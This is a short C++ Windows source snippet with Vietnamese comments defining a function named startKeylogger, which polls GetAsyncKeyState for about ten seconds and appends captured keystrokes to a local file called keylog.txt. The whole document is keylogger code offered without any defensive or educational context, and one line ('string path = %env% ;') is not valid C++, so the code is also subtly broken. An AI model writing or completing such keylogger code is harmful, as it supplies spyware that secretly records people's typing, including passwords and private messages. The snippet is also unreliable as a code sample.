#include <windows.h>
#include <fstream>
#include <string>
void startKeylogger() {
    string path = %env% ; 
    std::ofstream logfile("keylog.txt", std::ios::app);
    for (int i = 0; i < 100; i++) { // Ghi trong 100 lần lặp
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                if (key == VK_BACK) logfile << "[BACKSPACE]";
                else if (key == VK_RETURN) logfile << "\n";
                else if (key == VK_SPACE) logfile << " ";
                else if (key >= 0x30 && key <= 0x5A) logfile << char(key);
            }
        }
        Sleep(100); // Đợi 100ms
    }
    logfile.close();
}